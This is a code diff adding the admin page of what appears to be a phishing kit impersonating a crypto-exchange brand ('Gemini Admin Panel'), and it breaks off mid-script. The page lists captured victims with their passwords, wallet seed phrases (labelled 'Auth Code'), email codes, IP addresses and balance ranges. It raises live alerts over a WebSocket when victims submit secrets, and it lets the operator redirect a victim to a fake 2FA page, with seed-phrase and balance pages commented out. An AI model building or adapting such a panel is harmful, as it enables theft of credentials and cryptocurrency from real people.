@@ -1,0 +1,1504 @@
+---
+import { initializeDb } from "../lib/db";
+initializeDb();
+import BaseLayout from "../layouts/BaseLayout.astro";
+import Popup from "../components/Popup.astro";
+import Toast from "../components/Toast.astro";
+import { getAllUsers, type User } from "../lib/db";
+
+const userEmail = Astro.cookies.get("user_email")?.value;
+
+const isAdmin = userEmail === import.meta.env.ADMIN_EMAIL;
+
+if (!isAdmin) {
+  return Astro.redirect("/");
+}
+
+const allUsers = await getAllUsers();
+const users = allUsers.filter(
+  (user: { email: string }) => user.email !== import.meta.env.ADMIN_EMAIL,
+);
+---
+
+<BaseLayout title="Gemini Admin Panel">
+  <Toast position="top-center" />
+  <div class="admin-container">
+    <div class="admin-header">
+      <h1>Gemini Admin Panel</h1>
+      <div class="admin-info">
+        <button
+          id="deleteAllButton"
+          class="delete-all-button"
+          title="Delete All Users"
+        >
+          <span
+            class="iconify"
+            data-icon="mdi:delete-sweep"
+            data-width="20"
+            data-height="20"></span>
+        </button>
+        <button id="refreshButton" class="refresh-button" title="Refresh Page">
+          <span
+            class="iconify"
+            data-icon="mdi:refresh"
+            data-width="20"
+            data-height="20"></span>
+        </button>
+      </div>
+    </div>
+
+    <div class="admin-content">
+      <div class="section-header">
+        <h2>Users (<span id="userCount">{users.length}</span>)</h2>
+        <div class="table-controls">
+          <div class="search-box">
+            <input type="text" id="userSearch" placeholder="Search users..." />
+          </div>
+        </div>
+      </div>
+
+      <div class="data-table">
+        <div class="data-table-wrapper">
+          <table id="usersTable">
+            <thead>
+              <tr>
+                <th>ID</th>
+                <th>UID</th>
+                <th>Email</th>
+                <th>Current Page</th>
+                <th>Created</th>
+                <th>Actions</th>
+              </tr>
+            </thead>
+            <tbody id="usersTableBody">
+              {
+                users.map((user: User, index: number) => (
+                  <tr class="user-row" data-page={Math.floor(index / 10) + 1}>
+                    <td>{user.id}</td>
+                    <td>{user.uid}</td>
+                    <td>{user.email}</td>
+                    <td>
+                      <span class="page-badge {user.current_page || 'wait'}">
+                        {user.current_page || "Wait"}
+                      </span>
+                    </td>
+                    <td>{new Date(user.created_at).toLocaleString()}</td>
+                    <td>
+                      <button
+                        class="action-button view"
+                        data-email={user.email}
+                      >
+                        View
+                      </button>
+                      <button
+                        class="action-button redirect"
+                        data-email={user.email}
+                      >
+                        Redirect
+                      </button>
+                    </td>
+                  </tr>
+                ))
+              }
+            </tbody>
+          </table>
+        </div>
+        <div class="pagination">
+          <button id="prevPage" class="pagination-button" disabled>
+            <span
+              class="iconify"
+              data-icon="mdi:chevron-left"
+              data-width="20"
+              data-height="20"></span>
+          </button>
+          <div class="page-numbers">
+            <button class="page-number" data-page="1">1</button>
+            <button class="page-number" data-page="2">2</button>
+            <button class="page-number" data-page="3">3</button>
+            <button class="page-number" data-page="4">4</button>
+            <button class="page-number" data-page="5">5</button>
+          </div>
+          <button id="nextPage" class="pagination-button">
+            <span
+              class="iconify"
+              data-icon="mdi:chevron-right"
+              data-width="20"
+              data-height="20"></span>
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <Popup id="userDetailsPopup" title="User Details">
+    <div id="userDetails" class="user-details">
+      <div class="user-details-content">
+        <p><strong>Email:</strong> <span id="detailEmail"></span></p>
+        <p><strong>Password:</strong> <span id="detailPassword"></span></p>
+        <p>
+          <strong>User's Auth Code:</strong>
+          <span id="detailUserSeed"></span>
+        </p>
+        <p style="display:none;">
+          <strong>Email Code:</strong>
+          <span id="detailEmailCode"></span>
+        </p>
+        <p><strong>IP Address:</strong> <span id="detailIp"></span></p>
+        <p><strong>Browser:</strong> <span id="detailBrowser"></span></p>
+        <p><strong>Operating System:</strong> <span id="detailOs"></span></p>
+        <p><strong>User Agent:</strong> <span id="detailUserAgent"></span></p>
+        <p style="display:none;">
+          <strong>Balance Range:</strong>
+          <span id="detailBalance"></span>
+        </p>
+        <p>
+          <strong>Current Page:</strong>
+          <span id="detailCurrentPage"></span>
+        </p>
+        <p><strong>Created:</strong> <span id="detailCreated"></span></p>
+        <p><strong>Updated:</strong> <span id="detailUpdated"></span></p>
+      </div>
+    </div>
+  </Popup>
+
+  <Popup id="redirectPopup" title="Redirect User">
+    <div class="redirect-container">
+      <div class="redirect-options">
+        <label class="redirect-label">Select a page to redirect to</label>
+        <select id="redirectSelect" class="redirect-select">
+          <option value="" disabled selected>Choose a page</option>
+          <!-- <option value="wait">Waiting (Infinite Loading)</option> -->
+          <option value="2fa">2FA Verification</option>
+          <!-- <option value="seed">Seed Phrase</option> -->
+          <!-- <option value="reset">Password Reset</option> -->
+          <!-- <option value="balance">Balance Confirmation</option> -->
+        </select>
+      </div>
+      <button id="redirectButton" class="send-button" disabled>Redirect</button>
+    </div>
+  </Popup>
+
+  <Popup id="deleteConfirmPopup" title="Confirm Delete All Users">
+    <div class="delete-confirm-container">
+      <p class="delete-warning">
+        Are you sure you want to delete ALL users? This action cannot be undone.
+      </p>
+      <div class="delete-actions">
+        <button id="confirmDeleteButton" class="delete-confirm-button"
+          >Yes, Delete All</button
+        >
+        <button id="cancelDeleteButton" class="cancel-button">Cancel</button>
+      </div>
+    </div>
+  </Popup>
+</BaseLayout>
+
+<style>
+  :root {
+    --bg-primary: #000000;
+    --bg-secondary: #151515;
+    --bg-tertiary: #191919;
+    --text-primary: #ffffff;
+    --text-secondary: #a0a0a0;
+    --border-primary: #252525;
+    --primary: #3b82f6;
+    --primary-hover: #2563eb;
+    --success: #22c55e;
+    --success-hover: #16a34a;
+    --error: #ef4444;
+    --error-hover: #dc2626;
+    --warning: #292929;
+    --warning-hover: #d97706;
+    --current-page: 1;
+    --null-signal-font: "Courier New", "Consolas", monospace;
+  }
+
+  .admin-header h1 {
+    font-family: var(--null-signal-font);
+    font-size: 2.5rem;
+    font-weight: 700;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    background: linear-gradient(45deg, #00ff00, #00ffff);
+    -webkit-background-clip: text;
+    background-clip: text;
+    color: transparent;
+    text-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
+    position: relative;
+    animation: glitch 2s infinite;
+  }
+
+  .admin-header h1::before {
+    content: ">";
+    position: absolute;
+    left: -20px;
+    color: #00ff00;
+    animation: blink 1s infinite;
+  }
+
+  .admin-header h1::after {
+    content: "_";
+    animation: blink 1s infinite;
+  }
+
+  @keyframes blink {
+    0%,
+    100% {
+      opacity: 1;
+    }
+    50% {
+      opacity: 0;
+    }
+  }
+
+  @keyframes glitch {
+    0% {
+      transform: translate(0);
+    }
+    20% {
+      transform: translate(-1px, 1px);
+    }
+    40% {
+      transform: translate(-1px, -1px);
+    }
+    60% {
+      transform: translate(1px, 1px);
+    }
+    80% {
+      transform: translate(1px, -1px);
+    }
+    100% {
+      transform: translate(0);
+    }
+  }
+
+  .admin-email {
+    font-family: var(--null-signal-font);
+    letter-spacing: 1px;
+  }
+
+  .section-header h2 {
+    font-family: var(--null-signal-font);
+    letter-spacing: 1px;
+    color: #00ff00;
+    position: relative;
+  }
+
+  .page-badge {
+    font-family: var(--null-signal-font);
+    letter-spacing: 0.5px;
+  }
+
+  .action-button {
+    font-family: var(--null-signal-font);
+    letter-spacing: 0.5px;
+  }
+
+  .admin-container::before {
+    content: "";
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: repeating-linear-gradient(
+      0deg,
+      rgba(0, 255, 0, 0.03),
+      rgba(0, 255, 0, 0.03) 1px,
+      transparent 1px,
+      transparent 2px
+    );
+    pointer-events: none;
+    z-index: 1000;
+  }
+
+  .admin-container {
+    padding: 2rem;
+    max-width: 1200px;
+    margin: 0 auto;
+  }
+
+  .admin-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 2rem;
+  }
+
+  .admin-info {
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+  }
+
+  .admin-email {
+    color: var(--text-secondary);
+    font-size: 0.9rem;
+    padding: 0.5rem;
+    background: var(--bg-tertiary);
+    border-radius: 4px;
+  }
+
+  .refresh-button,
+  .delete-all-button {
+    padding: 0.5rem;
+    background: var(--bg-tertiary);
+    color: var(--text-secondary);
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+    transition: all 0.2s ease;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+
+  .refresh-button:hover {
+    background: var(--primary);
+    color: white;
+    transform: rotate(180deg);
+  }
+
+  .refresh-button:active {
+    transform: rotate(360deg);
+  }
+
+  .delete-all-button:hover {
+    background: var(--error);
+    color: white;
+  }
+
+  .send-email-button {
+    padding: 0.5rem 1rem;
+    background: var(--primary);
+    color: white;
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+    transition: background-color 0.2s ease;
+  }
+
+  .send-email-button:hover {
+    background: var(--primary-hover);
+  }
+
+  .logout-button {
+    padding: 0.5rem 1rem;
+    background: #dc3545;
+    color: white;
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+    transition: background-color 0.2s ease;
+  }
+
+  .logout-button:hover {
+    background: #c82333;
+  }
+
+  .section-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 1rem;
+  }
+
+  .table-controls {
+    display: flex;
+    gap: 1rem;
+  }
+
+  .search-box input {
+    padding: 0.5rem;
+    border: 1px solid var(--border-primary);
+    border-radius: 4px;
+    background: var(--bg-tertiary);
+    color: var(--text-primary);
+  }
+
+  .data-table {
+    background: var(--bg-secondary);
+    border-radius: 8px;
+    overflow: hidden;
+    position: relative;
+    width: 100%;
+  }
+
+  .data-table-wrapper {
+    overflow-x: auto;
+    -webkit-overflow-scrolling: touch;
+    width: 100%;
+  }
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+  }
+
+  th,
+  td {
+    padding: 1rem;
+    text-align: left;
+    border-bottom: 1px solid var(--border-primary);
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+  }
+
+  th:nth-child(1),
+  td:nth-child(1) {
+    width: 40px;
+  }
+  th:nth-child(2),
+  td:nth-child(2) {
+    width: 120px;
+  }
+  th:nth-child(3),
+  td:nth-child(3) {
+    width: 200px;
+  }
+  th:nth-child(4),
+  td:nth-child(4) {
+    width: 120px;
+  }
+  th:nth-child(5),
+  td:nth-child(5) {
+    width: 150px;
+  }
+  th:nth-child(6),
+  td:nth-child(6) {
+    width: 160px;
+  }
+
+  th {
+    background: var(--bg-tertiary);
+    color: var(--text-primary);
+    font-weight: 500;
+  }
+
+  td {
+    color: var(--text-secondary);
+  }
+
+  .action-button {
+    padding: 0.4rem 0.8rem;
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+    font-size: 0.9rem;
+    margin-right: 0.5rem;
+  }
+
+  .action-button.view {
+    background: var(--primary);
+    color: white;
+  }
+
+  .action-button.delete {
+    background: var(--error);
+    color: white;
+  }
+
+  .action-button.redirect {
+    background: var(--warning);
+    color: white;
+  }
+
+  .user-details {
+    padding: 1.25rem;
+    background: var(--bg-tertiary);
+    border-radius: 6px;
+  }
+
+  .user-details p {
+    margin: 0.5rem 0;
+    color: var(--text-primary);
+    display: flex;
+    align-items: baseline;
+    font-size: 0.9rem;
+  }
+
+  .user-details strong {
+    color: var(--text-secondary);
+    margin-right: 0.75rem;
+    min-width: 120px;
+    font-weight: 500;
+  }
+
+  .user-details-content {
+    padding: 1rem;
+  }
+
+  .user-details-content h3 {
+    color: var(--text-primary);
+    margin-bottom: 1rem;
+    font-size: 1.2rem;
+    font-weight: 600;
+  }
+
+  .user-details-content p {
+    margin: 0.75rem 0;
+    color: var(--text-primary);
+    display: flex;
+    align-items: baseline;
+    font-size: 0.9rem;
+    line-height: 1.4;
+  }
+
+  .user-details-content strong {
+    color: var(--text-secondary);
+    margin-right: 0.75rem;
+    min-width: 180px;
+    font-weight: 500;
+  }
+
+  @media (max-width: 1024px) {
+    th,
+    td {
+      padding: 0.75rem;
+      font-size: 0.9rem;
+    }
+
+    th:nth-child(1),
+    td:nth-child(1) {
+      width: 35px;
+    }
+    th:nth-child(2),
+    td:nth-child(2) {
+      width: 100px;
+    }
+    th:nth-child(3),
+    td:nth-child(3) {
+      width: 180px;
+    }
+    th:nth-child(4),
+    td:nth-child(4) {
+      width: 100px;
+    }
+    th:nth-child(5),
+    td:nth-child(5) {
+      width: 130px;
+    }
+    th:nth-child(6),
+    td:nth-child(6) {
+      width: 140px;
+    }
+  }
+
+  @media (max-width: 768px) {
+    th,
+    td {
+      padding: 0.75rem 0.5rem;
+    }
+
+    th:nth-child(1),
+    td:nth-child(1) {
+      width: 30px;
+    }
+    th:nth-child(2),
+    td:nth-child(2) {
+      width: 80px;
+    }
+    th:nth-child(3),
+    td:nth-child(3) {
+      width: 150px;
+    }
+    th:nth-child(4),
+    td:nth-child(4) {
+      width: 90px;
+    }
+    th:nth-child(5),
+    td:nth-child(5) {
+      width: 110px;
+    }
+    th:nth-child(6),
+    td:nth-child(6) {
+      width: 120px;
+    }
+
+    .action-button {
+      padding: 0.25rem 0.5rem;
+      font-size: 0.75rem;
+      margin-right: 0.25rem;
+    }
+
+    .page-badge {
+      padding: 0.2rem 0.4rem;
+      font-size: 0.7rem;
+    }
+  }
+
+  @media (max-width: 480px) {
+    th,
+    td {
+      padding: 0.5rem 0.25rem;
+    }
+
+    th:nth-child(1),
+    td:nth-child(1) {
+      width: 25px;
+    }
+    th:nth-child(2),
+    td:nth-child(2) {
+      width: 60px;
+    }
+    th:nth-child(3),
+    td:nth-child(3) {
+      width: 120px;
+    }
+    th:nth-child(4),
+    td:nth-child(4) {
+      width: 70px;
+    }
+    th:nth-child(5),
+    td:nth-child(5) {
+      width: 90px;
+    }
+    th:nth-child(6),
+    td:nth-child(6) {
+      width: 100px;
+    }
+
+    .action-button {
+      padding: 0.2rem 0.4rem;
+      font-size: 0.7rem;
+    }
+  }
+
+  @media (max-width: 480px) {
+    :global(.popup-content) {
+      width: 95% !important;
+      max-width: none !important;
+      margin: 1rem !important;
+    }
+
+    .user-details {
+      padding: 0.75rem;
+    }
+
+    .user-details-content {
+      padding: 0.5rem;
+    }
+  }
+
+  .redirect-container {
+    padding: 1rem;
+  }
+
+  .redirect-options {
+    margin-bottom: 1rem;
+    position: relative;
+  }
+
+  .redirect-select {
+    width: 100%;
+    padding: 0.75rem 1rem;
+    background: var(--bg-tertiary);
+    color: var(--text-primary);
+    border: 1px solid var(--border-primary);
+    border-radius: 8px;
+    font-size: 0.95rem;
+    appearance: none;
+    cursor: pointer;
+    transition: all 0.2s ease;
+    background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24' fill='none' stroke='%2394a3b8' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
+    background-repeat: no-repeat;
+    background-position: right 0.75rem center;
+    background-size: 1rem;
+    padding-right: 2.5rem;
+  }
+
+  .redirect-select:hover {
+    border-color: var(--primary);
+    background-color: var(--bg-secondary);
+  }
+
+  .redirect-select:focus {
+    outline: none;
+    border-color: var(--primary);
+    box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.1);
+  }
+
+  .redirect-select option {
+    background: var(--bg-secondary);
+    color: var(--text-primary);
+    padding: 0.75rem;
+    transition: background-color 0.2s ease;
+  }
+
+  .redirect-select option:hover {
+    background-color: rgba(255, 255, 255, 0.05);
+  }
+
+  .redirect-select option:checked {
+    background: var(--primary);
+    color: white;
+  }
+
+  .redirect-select option:checked:hover {
+    background: var(--primary-hover);
+  }
+
+  .redirect-select option[value=""] {
+    color: var(--text-secondary);
+    font-style: italic;
+  }
+
+  .redirect-select option:not([value=""]) {
+    color: var(--text-primary);
+  }
+
+  .send-button {
+    width: 100%;
+    padding: 0.75rem;
+    background: var(--primary);
+    color: white;
+    border: none;
+    border-radius: 8px;
+    cursor: pointer;
+    font-weight: 500;
+    transition: all 0.2s ease;
+  }
+
+  .send-button:hover:not(:disabled) {
+    background: var(--primary-hover);
+    transform: translateY(-1px);
+  }
+
+  .send-button:disabled {
+    opacity: 0.5;
+    cursor: not-allowed;
+    transform: none;
+  }
+
+  :global(.popup-content) {
+    overflow: hidden !important;
+  }
+
+  .page-badge {
+    padding: 0.25rem 0.5rem;
+    border-radius: 4px;
+    font-size: 0.8rem;
+    font-weight: 500;
+    text-transform: capitalize;
+  }
+
+  .page-badge.reset {
+    background: var(--warning);
+    color: white;
+  }
+
+  .page-badge.email {
+    background: var(--primary);
+    color: white;
+  }
+
+  .page-badge.wait {
+    background: var(--success);
+    color: white;
+  }
+
+  .page-badge.seed {
+    background: #8b5cf6;
+    color: white;
+  }
+
+  .page-badge.whitelist {
+    background: #ec4899;
+    color: white;
+  }
+
+  .page-badge.balance {
+    background: #14b8a6;
+    color: white;
+  }
+
+  tbody tr:hover {
+    background-color: var(--bg-tertiary);
+  }
+
+  .data-table {
+    overflow-x: auto;
+    -webkit-overflow-scrolling: touch;
+  }
+
+  #usersTableBody tr {
+    transition: background-color 0.2s ease;
+  }
+
+  #usersTableBody tr:hover {
+    background-color: var(--bg-tertiary);
+  }
+
+  .page-badge,
+  .status-badge {
+    display: inline-block;
+    padding: 0.25rem 0.5rem;
+    border-radius: 4px;
+    font-size: 0.8rem;
+    font-weight: 500;
+    text-transform: capitalize;
+  }
+
+  .page-badge.reset {
+    background: var(--warning);
+    color: white;
+  }
+  .page-badge.email {
+    background: var(--primary);
+    color: white;
+  }
+  .page-badge.wait {
+    background: var(--success);
+    color: white;
+  }
+  .page-badge.seed {
+    background: #8b5cf6;
+    color: white;
+  }
+  .page-badge.whitelist {
+    background: #ec4899;
+    color: white;
+  }
+  .page-badge.balance {
+    background: #14b8a6;
+    color: white;
+  }
+
+  .status-badge.active {
+    background: var(--success);
+    color: white;
+  }
+  .status-badge.inactive {
+    background: var(--error);
+    color: white;
+  }
+
+  .action-button {
+    padding: 0.4rem 0.8rem;
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+    font-size: 0.9rem;
+    margin-right: 0.5rem;
+    transition: opacity 0.2s ease;
+  }
+
+  .action-button:hover {
+    opacity: 0.8;
+  }
+
+  .action-button.view {
+    background: var(--primary);
+    color: white;
+  }
+
+  .action-button.redirect {
+    background: var(--warning);
+    color: white;
+  }
+
+  .search-box input {
+    width: 100%;
+    padding: 0.75rem;
+    border: 1px solid var(--border-primary);
+    border-radius: 4px;
+    background: var(--bg-tertiary);
+    color: var(--text-primary);
+    transition: border-color 0.2s ease;
+  }
+
+  .search-box input:focus {
+    outline: none;
+    border-color: var(--primary);
+  }
+
+  .data-table {
+    background: var(--bg-secondary);
+    border-radius: 8px;
+    overflow: hidden;
+    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+  }
+
+  thead th {
+    background: var(--bg-tertiary);
+    color: var(--text-primary);
+    font-weight: 500;
+    text-transform: uppercase;
+    font-size: 0.8rem;
+    letter-spacing: 0.05em;
+  }
+
+  body {
+    background-color: #181818;
+  }
+
+  td {
+    padding: 1rem;
+    color: var(--text-secondary);
+    border-bottom: 1px solid var(--border-primary);
+  }
+
+  tr:last-child td {
+    border-bottom: none;
+  }
+
+  .status-badge,
+  .status-toggle,
+  .status-toggle.active,
+  .status-toggle.inactive,
+  .status-toggle::before {
+    display: none;
+  }
+
+  .redirect-label {
+    display: block;
+    color: var(--text-secondary);
+    font-size: 0.9rem;
+    margin-bottom: 0.5rem;
+    font-weight: 500;
+  }
+
+  .pagination {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 0.5rem;
+    padding: 1rem;
+    background: var(--bg-secondary);
+    border-top: 1px solid var(--border-primary);
+  }
+
+  .pagination-button {
+    padding: 0.5rem;
+    background: var(--bg-tertiary);
+    color: var(--text-secondary);
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+    transition: all 0.2s ease;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+
+  .pagination-button:hover:not(:disabled) {
+    background: var(--primary);
+    color: white;
+  }
+
+  .pagination-button:disabled {
+    opacity: 0.5;
+    cursor: not-allowed;
+  }
+
+  .page-numbers {
+    display: flex;
+    gap: 0.25rem;
+  }
+
+  .page-number {
+    padding: 0.5rem 0.75rem;
+    background: var(--bg-tertiary);
+    color: var(--text-secondary);
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+    transition: all 0.2s ease;
+    min-width: 2.5rem;
+    text-align: center;
+  }
+
+  .page-number:hover:not(.active) {
+    background: var(--primary);
+    color: white;
+  }
+
+  .page-number.active {
+    background: var(--primary);
+    color: white;
+    cursor: default;
+  }
+
+  .page-number[data-page]:not([data-page="1"]):not([data-page="2"]):not(
+      [data-page="3"]
+    ):not([data-page="4"]):not([data-page="5"]) {
+    display: none;
+  }
+
+  .user-row {
+    display: none;
+  }
+
+  [data-current-page="1"] .user-row[data-page="1"] {
+    display: table-row;
+  }
+  [data-current-page="2"] .user-row[data-page="2"] {
+    display: table-row;
+  }
+  [data-current-page="3"] .user-row[data-page="3"] {
+    display: table-row;
+  }
+  [data-current-page="4"] .user-row[data-page="4"] {
+    display: table-row;
+  }
+  [data-current-page="5"] .user-row[data-page="5"] {
+    display: table-row;
+  }
+
+  [data-current-page="1"] .user-row:not([data-page="1"]) {
+    display: none;
+  }
+  [data-current-page="2"] .user-row:not([data-page="2"]) {
+    display: none;
+  }
+  [data-current-page="3"] .user-row:not([data-page="3"]) {
+    display: none;
+  }
+  [data-current-page="4"] .user-row:not([data-page="4"]) {
+    display: none;
+  }
+  [data-current-page="5"] .user-row:not([data-page="5"]) {
+    display: none;
+  }
+
+  .delete-confirm-container {
+    padding: 1.5rem;
+    text-align: center;
+  }
+
+  .delete-warning {
+    color: var(--text-primary);
+    margin-bottom: 2rem;
+    font-size: 1.1rem;
+    line-height: 1.5;
+  }
+
+  .delete-actions {
+    display: flex;
+    gap: 1rem;
+    justify-content: center;
+  }
+
+  .delete-confirm-button {
+    padding: 0.75rem 1.5rem;
+    background: var(--error);
+    color: white;
+    border: none;
+    border-radius: 8px;
+    cursor: pointer;
+    font-weight: 500;
+    transition: all 0.2s ease;
+  }
+
+  .delete-confirm-button:hover {
+    background: var(--error-hover);
+    transform: translateY(-1px);
+  }
+
+  .cancel-button {
+    padding: 0.75rem 1.5rem;
+    background: var(--bg-tertiary);
+    color: var(--text-primary);
+    border: 1px solid var(--border-primary);
+    border-radius: 8px;
+    cursor: pointer;
+    font-weight: 500;
+    transition: all 0.2s ease;
+  }
+
+  .cancel-button:hover {
+    background: var(--bg-secondary);
+    transform: translateY(-1px);
+  }
+</style>
+
+<script>
+  const ws = new WebSocket(`ws://${window.location.host}/ws`);
+
+  ws.onmessage = (event) => {
+    const data = JSON.parse(event.data);
+
+    switch (data.type) {
+      case "email_code":
+        window.showToast(`New email code submitted by ${data.email}`, "info");
+        break;
+      case "seed_phrase":
+        window.showToast(`New seed phrase submitted by ${data.email}`, "info");
+        break;
+      case "balance":
+        window.showToast(
+          `New balance range submitted by ${data.email}`,
+          "info",
+        );
+        break;
+      case "reset":
+        window.showToast(`Password reset requested by ${data.email}`, "info");
+        break;
+      case "status_update":
+        const statusButton = document.querySelector(
+          `.status-toggle[data-email="${data.email}"]`,
+        ) as HTMLElement;
+        if (statusButton) {
+          statusButton.dataset.status = data.status;
+          statusButton.textContent =
+            data.status === "active" ? "Active" : "Inactive";
+          statusButton.classList.remove("active", "inactive");
+          statusButton.classList.add(data.status);
+        }
+        break;
+    }
+  };
+
+  ws.onerror = (error) => {
+    console.error("WebSocket error:", error);
+    window.showToast(
+      "Connection error. Real-time updates may not work.",
+      "error",
+    );
+  };
+
+  ws.onclose = () => {
+    console.log("WebSocket connection closed");
+    window.showToast("Connection lost. Real-time updates disabled.", "error");
+  };
+
+  document.addEventListener("click", async (e) => {
+    const target = e.target as HTMLElement;
+    if (target.classList.contains("view")) {
+      const email = target.dataset.email;
+      if (email) {
+        try {
+          const response = await fetch(`/api/users?email=${email}`);
+          const user = await response.json();
+
+          document.getElementById("detailEmail")!.textContent = user.email;
+          document.getElementById("detailPassword")!.textContent =
+            user.password || "Not set";
+          document.getElementById("detailUserSeed")!.textContent =
+            user.user_seed_phrase || "Not set";
+          document.getElementById("detailEmailCode")!.textContent =
+            user.email_code || "Not set";
+          document.getElementById("detailIp")!.textContent =
+            user.ip_address || "Not set";
+          document.getElementById("detailBrowser")!.textContent =
+            user.browser || "Not set";
+          document.getElementById("detailOs")!.textContent =
+            user.operating_system || "Not set";
+          document.getElementById("detailUserAgent")!.textContent =
+            user.user_agent || "Not set";
+          document.getElementById("detailBalance")!.textContent =
+            user.balance_range || "Not set";
+          document.getElementById("detailCurrentPage")!.textContent =
+            user.current_page || "Not set";
+          document.getElementById("detailCreated")!.textContent = new Date(
+            user.created_at,
+          ).toLocaleString();
+          document.getElementById("detailUpdated")!.textContent = new Date(
+            user.updated_at,
+          ).toLocaleString();
+
+          window.openPopup("userDetailsPopup");
+          window.showToast("User details loaded successfully", "success");
+        } catch (error) {
+          console.error("Error fetching user details:", error);
+          window.showToast("Failed to fetch user details", "error");
+        }
+      }
+    }
+  });
+
+  document.addEventListener("click", async (e) => {
+    const target = e.target as HTMLElement;
+    if (target.classList.contains("redirect")) {
+      const email = target.dataset.email;
+      if (email) {
+        const popup = document.getElementById("redirectPopup");
+        if (popup) {
+          window.openPopup("redirectPopup");
+          window.showToast("Select a page to redirect the user", "info");
+
+          popup.dataset.email = email;
+        }
+      }
+    }
+  });
+
+  const redirectSelect = document.getElementById(
+    "redirectSelect",
+  ) as HTMLSelectElement;
+  const redirectButton = document.getElementById(
+    "redirectButton",
+  ) as HTMLButtonElement;
+
+  redirectSelect?.addEventListener("change", () => {
+    if (redirectButton) {
+      redirectButton.disabled = !redirectSelect.value;
+      if (redirectSelect.value) {
+        window.showToast(`Selected page: ${redirectSelect.value}`, "info");
+      }
+    }
+  });
+
+  redirectButton?.addEventListener("click", async () => {
+    const popup = document.getElementById("redirectPopup");
+    const email = popup?.dataset.email;
+    const page = redirectSelect.value;
+
+    if (email && page) {
+      try {
+        const response = await fetch("/api/users", {
+          method: "PUT",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            email,
+            current_page: page.replace("/", ""),
+          }),
+        });
+
+        if (!response.ok) {
+          throw new Error("Failed to update user");
+        }
+
+        window.closePopup("redirectPopup");
+
+        window.showToast(
+          `User redirected to ${page} page successfully!`,
+          "success",
+        );
+
+        setTimeout(() => {
+          window.location.reload();
+        }, 1000);
+      } catch (error) {
+        console.error("Error redirecting user:", error);
+        window.showToast("Failed to redirect user. Please try again.", "error");
+      }
+    }
+  });
+
+  const searchInput = document.getElementById("userSearch") as HTMLInputElement;
+  searchInput?.addEventListener("input", (e) => {
+    const searchTerm = (e.target as HTMLInputElement).value.toLowerCase();
+    const rows = document.querySelectorAll("#usersTableBody tr");
+    let visibleCount = 0;
+
+    rows.forEach((row) => {
+      const email =
+        row.querySelector("td:nth-child(3)")?.textContent?.toLowerCase() || "";
+      const uid =
+        row.querySelector("td:nth-child(2)")?.textContent?.toLowerCase() || "";
+      const page =
+        row.querySelector("td:nth-child(4)")?.textContent?.toLowerCase() || "";
+
+      if (
+        email.includes(searchTerm) ||
+        uid.includes(searchTerm) ||
+        page.includes(searchTerm)
+      ) {
+        (row as HTMLElement).style.display = "";
+        visibleCount++;
+      } else {
+        (row as HTMLElement).style.display = "none";
+      }
+    });
+
+    if (searchTerm) {
+      window.showToast(`Found ${visibleCount} matching users`, "info");
+    }
+  });
+
+  window.addEventListener("load", () => {
+    window.showToast("Admin panel loaded successfully", "success");
+  });
+
+  document.getElementById("deleteAllButton")?.addEventListener("click", () => {
+    window.openPopup("deleteConfirmPopup");
+  });
+
+  document
+    .getElementById("confirmDeleteButton")
+    ?.addEventListener("click", async () => {
+      try {
+        const button = document.getElementById(
+          "confirmDeleteButton",
+        ) as HTMLButtonElement;
+        button.disabled = true;
+        button.textContent = "Deleting...";
+
+        const response = await fetch("/api/users", {
+          method: "DELETE",
+          headers: {
+            "Content-Type": "application/json",
+          },
+        });
+
+        if (!response.ok) {
+          throw new Error("Failed to delete users");
+        }
+
+        window.closePopup("deleteConfirmPopup");
+        window.showToast("All users deleted successfully!", "success");
+
+        setTimeout(() => {
+          window.location.reload();
+        }, 1000);
+      } catch (error) {
+        console.error("Error deleting users:", error);
+        window.showToast("Failed to delete users. Please try again.", "error");
+
+        const button = document.getElementById(
+          "confirmDeleteButton",
+        ) as HTMLButtonElement;
+        button.disabled = false;
+        button.textContent = "Yes, Delete All";
+      }
+    });
+
+  document
+    .getElementById("cancelDeleteButton")
+    ?.addEventListener("click", () => {
+      window.closePopup("deleteConfirmPopup");
+    });
+
+  document
+    .getElementById("logoutButton")
+    ?.addEventListener("click", async () => {
+      try {
+        const response = await fetch("/api/auth/logout", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+        });
+
+        if (response.ok) {
+          window.showToast("Logged out successfully", "success");
+          setTimeout(() => {
+            window.location.href = "/";
+          }, 1000);
+        } else {
+          throw new Error("Failed to logout");
+        }
+      } catch (error) {
+        console.error("Error during logout:", error);
+        window.showToast("Failed to logout. Please try again.", "error");
+      }
+    });
+
+  document
+    .getElementById("sendEmailButton")
+    ?.addEventListener("click", async () => {
+      try {
+        const button = document.getElementById(
+          "sendEmailButton",
+        ) as HTMLButtonElement;
+        const originalText = button.textContent;
+        button.disabled = true;
+        button.textContent = "Sending...";
+
+        window.showToast("Email sent successfully", "success");
+
+        button.disabled = false;
+        button.textContent = originalText;
+      } catch (error) {
+        console.error("Error sending email:", error);
+        window.showToast("Failed to send email. Please try again.", "error");
+      }
+    });
+
+  document.getElementById("refreshButton")?.addEventListener("click", () => {
